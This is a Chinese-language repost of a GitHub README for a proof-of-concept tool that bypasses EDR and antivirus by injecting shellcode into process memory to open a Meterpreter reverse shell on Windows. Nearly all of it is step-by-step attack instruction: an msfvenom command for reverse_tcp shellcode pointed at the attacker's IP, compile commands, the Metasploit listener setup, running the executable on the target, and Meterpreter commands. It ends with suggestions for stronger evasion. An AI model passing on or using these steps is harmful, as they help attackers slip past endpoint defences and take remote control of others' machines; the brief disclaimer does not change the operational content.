#  【Exp】绕过 EDR 防病毒软件以获取 Shell 访问权限   
 独眼情报   2024-09-28 17:01  
  
## EDR 和防病毒绕过以获得 Shell 访问权限  
  
此仓库包含了一个 **概念验证 (PoC)** ，用于通过内存注入技术绕过 EDR 和防病毒解决方案。代码执行了一个生成反向 Shell 的 shellcode，成功规避了各种安全机制的检测。  
## 描述  
  
此项目展示了如何使用 Windows API 函数（如 VirtualAlloc、CreateThread 和 WaitForSingleObject）绕过 EDR 和防病毒保护。有效载荷直接注入到进程内存中，不会被安全工具检测到，从而与远程系统建立连接以实现反向 Shell。  
>   
> **免责声明：** 本代码仅用于教育目的。请负责任地使用，并且仅在您有明确权限进行测试的环境中使用。  
  
## 特性  
- 绕过标准的 EDR 和防病毒解决方案  
  
- 在内存中执行 shellcode 以创建反向 Shell  
  
- 使用 VirtualAlloc 和 CreateThread 将有效载荷直接注入进程内存  
  
## 要求  
- Windows 操作系统（已在 Windows 11 Pro 上测试）  
  
- Kali Linux（用于反向 Shell 监听器）  
  
- Visual Studio 或任何 C# 编译器  
  
## 编译和运行步骤  
### 1. 克隆仓库  
```
https://github.com/murat-exp/EDR-Antivirus-Bypass-to-Gain-Shell-Access.git
cd EDR-Antivirus-Bypass-Shell-Access

```  
### 2. 修改 Shellcode  
  
编译前，请确保修改 shellcode 以指向您自己的 IP 地址和端口用于反向 Shell。您可以使用 msfvenom 生成 shellcode：  
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f csharp

```  
  
将生成的 shellcode 替换 Program.cs 中的 byte[] buf 部分。  
### 3. 编译代码  
  
在 Visual Studio 中打开项目，或使用以下命令使用 .NET SDK 编译代码：  
```
csc bypass.cs

```  
  
**或者，您可以使用 Release 模式进行编译以获得更好的优化：**  
```
csc -optimize bypass.cs

```  
### 4. 在 Kali 上启动监听器  
  
在您的 Kali Linux 机器上启动监听器以捕获反向 Shell。在 Metasploit 中使用以下命令：  
```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT <YOUR_PORT>
run

```  
### 5. 执行有效载荷  
  
将编译好的 .exe 文件传输到 Windows 机器上。您可以手动执行该文件或使用其他方法运行该文件：  
```
bypass.exe

```  
1. 获取 Shell  
  
一旦在目标机器上执行了有效载荷，您应该会在 Metasploit 控制台中看到一个反向 Shell 会话。从那里，您可以与系统进行交互：  
```
meterpreter > sysinfo
meterpreter > shell

```  
1. 其他绕过技术  
  
为了避免被高级 EDR 解决方案检测到，可以考虑使用诸如进程注入、混淆或 AMSI 绕过等技术。此 PoC 可以通过这些方法进行扩展，以实现更强大的规避。  
>   
> https://github.com/murat-exp/EDR-Antivirus-Bypass-to-Gain-Shell-Access  
  
  
  
